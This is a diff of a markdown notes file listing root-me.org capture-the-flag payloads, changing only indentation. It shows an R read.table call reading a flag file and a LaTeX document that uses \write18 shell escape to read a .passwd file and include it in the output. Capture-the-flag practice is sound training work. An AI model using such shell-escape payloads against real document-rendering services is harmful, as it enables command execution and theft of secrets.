@@ -9,7 +9,7 @@ Some [root-me.org](https://www.root-me.org/) payloads
 
 ### Payload 
 ```R
- 	read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
+read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
 ```
 
 ## LaTeX - Input
@@ -17,7 +17,7 @@ Some [root-me.org](https://www.root-me.org/) payloads
 
 ### Payload 
 ```LaTex
- 	read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
+read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
 ```
 
 ## LaTeX - Command execution
@@ -25,12 +25,12 @@ Some [root-me.org](https://www.root-me.org/) payloads
 
 ### Payload
 ```LaTex
-	catcode `\_=12
-	\documentclass{article}
-	\begin{document}
-	\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/buffer.tmp}
-	\input{/tmp/buffer.tmp}
-	\end{document}
+catcode `\_=12
+\documentclass{article}
+\begin{document}
+\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/buffer.tmp}
+\input{/tmp/buffer.tmp}
+\end{document}
 ```
 
 ## Powershell - SecureString
